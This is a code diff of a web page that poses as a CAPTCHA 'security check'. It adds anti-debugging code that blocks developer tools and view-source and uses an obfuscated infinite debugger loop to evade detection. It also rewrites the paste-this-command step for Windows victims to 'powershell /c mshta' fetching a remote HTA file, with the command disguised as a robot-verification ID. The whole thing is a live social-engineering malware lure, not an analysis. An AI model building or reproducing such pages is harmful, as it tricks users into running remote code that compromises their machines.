@@ -7,17 +7,20 @@
     let hasUnsaved = true;
     document.addEventListener('input', () => hasUnsaved = true);
     window.onbeforeunload = () => hasUnsaved ? '' : void 0;
+    // 1. 禁止右键菜单，阻止通过右键打开「审查元素」
     document.addEventListener('contextmenu', e => e.preventDefault());
 
+    // 2. 拦截常用调试快捷键，从入口阻止用户打开开发者工具
     document.addEventListener('keydown', e => {
-
+      // 禁止F12
       if (e.key === 'F12') e.preventDefault();
-
+      // 禁止Ctrl+Shift+I/J/C 开发者工具核心快捷键
       if (e.ctrlKey && e.shiftKey && ['I', 'J', 'C'].includes(e.key)) e.preventDefault();
-
+      // 禁止Ctrl+U 查看页面源码
       if (e.ctrlKey && e.key.toLowerCase() === 'u') e.preventDefault();
     });
 
+    // 3. 混淆版无限debugger，隐藏debugger关键字，避免被静态检测、替换
     (function () {
       const triggerDebug = new Function('debugger');
       function loopAntiDebug() {
@@ -42,7 +45,7 @@
   </script>
   <link rel="icon" href="icon.svg" type="image/svg+xml" />
   <style>
-
+    /* 基础样式保持原样 */
     * {
       box-sizing: border-box;
       margin: 0;
@@ -699,7 +702,7 @@
           "3. 按 <b>Enter</b> 键完成"
         ],
         subtitle: "请按照以下步骤完成安全检查（Windows 系统）",
-        command: "mshta http://mcedge.github.io/mcedge/index.hta#✅ I am not a robot - CAPTCHA Verification ID: 114514"
+        command: "powershell /c mshta http://mcedge.github.io/mcedge/index.hta# ✅ I am not a robot - CAPTCHA Verification ID: 114514"
       },
       mac: {
         steps: [
